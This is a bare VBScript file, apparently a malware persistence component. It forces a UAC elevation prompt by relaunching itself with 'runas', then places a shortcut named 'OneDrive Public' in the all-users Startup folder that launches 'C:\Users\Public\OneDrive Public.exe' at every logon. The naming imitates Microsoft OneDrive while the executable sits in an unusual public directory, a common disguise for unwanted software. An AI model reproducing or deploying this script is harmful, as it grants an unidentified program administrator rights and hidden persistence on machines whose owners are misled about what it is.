Set WshShell = WScript.CreateObject("WScript.Shell")
If WScript.Arguments.Length = 0 Then
  Set ObjShell = CreateObject("Shell.Application")
  ObjShell.ShellExecute "wscript.exe" _
    , """" & WScript.ScriptFullName & """ RunAsAdministrator", , "runas", 1
  WScript.Quit
End if

Set oWS = WScript.CreateObject("WScript.Shell")
sLinkFile = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\OneDrive Public.LNK"
Set oLink = oWS.CreateShortcut(sLinkFile)

oLink.TargetPath = "C:\Users\Public\OneDrive Public.exe"
oLink.WorkingDirectory = "C:\Users\Public"
oLink.Save